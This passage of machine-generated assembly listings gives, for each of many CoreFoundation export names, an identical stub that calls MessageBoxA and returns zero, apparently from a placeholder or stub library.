call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_mkstemp
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_open
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_popcountll
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_cond_broadcast
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_cond_destroy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_cond_init
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_cond_signal
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_cond_timedwait_relative_np
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_cond_wait
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_equal
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_main_np
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_mutex_destroy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_mutex_init
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_mutex_lock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_mutex_trylock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_mutex_unlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_mutexattr_destroy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_mutexattr_init
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_mutexattr_settype
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_self
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_pthread_setname_np
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_rename
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_rmdir
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_snprintf_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_sscanf_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_stat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_strlcat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_strlcpy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_strncasecmp_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_strtod_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_strtol_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_strtoll_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_strtoul_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_strtoull_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_unlink
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_vasprintf
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_vasprintf_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFArgStuff
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFAttributedStringMtbl
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFBinaryPlistCreateObject
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFBinaryPlistGetOffsetForValueFromArray2
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFBinaryPlistGetOffsetForValueFromDictionary3
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFBinaryPlistGetTopLevelInfo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFBinaryPlistWrite
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFBinaryPlistWriteToStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFBinaryPlistWriteToStreamWithEstimate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFBinaryPlistWriteToStreamWithOptions
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFCharToUniCharFunc
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFConstantStringClassReference
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFConstantStringClassReferencePtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFDataMtbl
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFDefaultEightBitStringEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFDoExternRefOperation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFGetNextSearchPathEnumeration
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFInitialize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFOASafe
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFPreferencesSetPathHackEnabled
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFRangeMake
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFSetLastAllocationEventName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFSocketInitializeWinSock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFSpinLock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFSpinLockTry
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFSpinUnlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStartSearchPathEnumeration
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStorageGetCapacity
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStorageGetValueSize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStorageSetAlwaysFrozen
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringAppendBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringCheckAndReplace
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringComputeEightBitStringEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringCreateImmutableFunnel2
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringDecodeByteStream2
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringDecodeByteStream3
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringEncodeByteStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringHash
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringInitializeSystemEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringIsEightBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringMakeConstantString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringMtbl
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFStringNoteErrors
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFURLReservedPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFURLResourceInfoPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFURLSetReservedPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
__CFURLSetResourceInfoPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleAllowMixedLocalizationsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleDisplayNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleDocumentTypesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleExecutablePathKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleGetInfoHTMLKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleGetInfoStringKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleIconFileKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleInfoPlistURLKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleInitialPathKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleNumericVersionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldDocumentTypesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldExecutableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldIconFileKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldInfoDictionaryVersionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldShortVersionStringKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldTypeExtensions1Key
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldTypeExtensions2Key
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldTypeIconFileKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldTypeNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldTypeOSTypesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleOldTypeRoleKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundlePackageTypeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundlePrincipalClassKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleRawInfoPlistURLKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleResolvedPathKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleResourceSpecificationKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleResourcesFileMappedKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleShortVersionStringKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleSignatureKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleSupportedPlatformsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleTypeExtensionsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleTypeIconFileKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleTypeMIMETypesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleTypeNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleTypeOSTypesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleTypeRoleKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleURLIconFileKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleURLNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleURLSchemesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFBundleURLTypesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFSystemVersionBuildStringKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFSystemVersionBuildVersionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFSystemVersionProductCopyrightKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFSystemVersionProductNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFSystemVersionProductUserVisibleVersionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFSystemVersionProductVersionExtraKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFSystemVersionProductVersionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_kCFSystemVersionProductVersionStringKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFAbsoluteTimeIntervalSince1904
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFAbsoluteTimeIntervalSince1970
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFAllocatorDefault
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFAllocatorMalloc
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFAllocatorMallocZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFAllocatorNull
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFAllocatorSystemDefault
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFAllocatorUseContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBooleanFalse
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBooleanTrue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBuddhistCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBundleDevelopmentRegionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBundleExecutableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBundleIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBundleInfoDictionaryVersionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBundleLocalizationsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBundleNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFBundleVersionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierBuddhist
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierChinese
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierCoptic
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierEthiopicAmeteAlem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierEthiopicAmeteMihret
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierGregorian
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierHebrew
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierISO8601
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierIndian
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierIslamic
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierIslamicCivil
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierJapanese
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierPersian
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCalendarIdentifierRepublicOfChina
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFChineseCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCopyStringBagCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCopyStringDictionaryKeyCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFCopyStringSetCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterAMSymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterAMSymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterAmbiguousYearStrategyKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterCalendarIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterCalendarIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterCalendarKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterCalendarName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterDefaultDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterDefaultDateKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterDefaultFormat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterDefaultFormatKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterDoesRelativeDateFormattingKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterEraSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterEraSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterGregorianStartDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterGregorianStartDateKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterIsLenient
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterIsLenientKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterLongEraSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterLongEraSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterMonthSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterMonthSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterPMSymbol
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterPMSymbolKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterQuarterSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterQuarterSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortMonthSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortMonthSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortQuarterSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortQuarterSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortStandaloneMonthSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortStandaloneMonthSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortStandaloneQuarterSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortStandaloneQuarterSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortStandaloneWeekdaySymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortStandaloneWeekdaySymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortWeekdaySymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterShortWeekdaySymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterStandaloneMonthSymbols
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFDateFormatterStandaloneMonthSymbolsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
